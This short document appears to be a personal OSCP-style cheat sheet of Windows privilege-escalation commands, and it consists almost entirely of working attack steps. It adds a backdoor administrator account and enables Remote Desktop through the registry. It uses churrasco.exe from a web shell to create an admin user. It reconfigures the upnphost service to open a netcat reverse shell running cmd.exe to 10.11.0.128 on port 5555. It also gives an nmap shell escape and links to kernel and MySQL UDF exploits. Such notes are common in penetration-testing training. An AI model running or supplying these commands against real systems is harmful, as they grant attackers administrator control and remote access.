Windows

Windows add new administrator

net user /add oscp attacker

net localgroup administrators oscp/add

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f



Authority/network service (asp.net shell)

Upload /usr/share/sqlninja/apps/churrasco.exe

churrasco -d "net user /add oscp oscp "

churrasco -d "net localgroup administrators oscp /add"

churrasco -d "NET LOCALGROUP "Remote Desktop Users" oscp/ADD"



Windows XP SP1 and earlier

sc config upnphost binpath= "C:\Inetpub\nc.exe -nv 10.11.0.128 5555 -e C:\Windows\system32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""

sc config upnphost depend= ""

sc qc upnphost

http://www.fuzzysecurity.com/tutorials/16.html





check application:

wmic_info.bat (http://www.fuzzysecurity.com/scripts/13.html)

nmap: sudo nmap –interactive --> !sh

mysql: https://github.com/amonsec/exploit/blob/master/linux/privs/MysqlUDF/mysql_udf_exploit.sh



MS16032 --> check optimum write up htb

Exploit suggester: https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester

https://github.com/amonsec/exploit/tree/master/windows/privs

checklist: https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md



Windows version of GTFObin

https://lolbas-project.github.io/#